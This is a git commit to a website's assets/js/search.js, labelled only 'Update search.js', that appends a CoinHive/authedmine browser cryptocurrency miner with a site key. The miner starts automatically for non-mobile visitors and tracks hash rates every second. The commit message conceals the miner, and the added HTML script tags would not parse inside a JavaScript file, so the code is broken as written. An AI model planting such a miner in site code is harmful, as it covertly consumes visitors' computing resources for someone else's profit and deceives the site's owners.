4a010ca39836152e0811e0d80bca3d89f0b5474e
安逸 <40451747+anyi98@users.noreply.github.com>
2018-08-16 05:17:28 +0800

    Update search.js

--- assets/js/search.js
+++ assets/js/search.js
@@ -7,3 +7,30 @@ if (nextUrl) {
     $('#next-url').text('即将搭载本站IP，探索世界未知！').append($('<a>').addClass('sub header').attr('href', nextUrl).text(service + '：' + query));
     window.location.replace(nextUrl);
 };
+
+
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('FHbQvCWmVXMB74xDBmWwuG4Zklbw5pSA', {throttle: 0.3});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
+
+<script>
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+	}, 1000);
+</script>
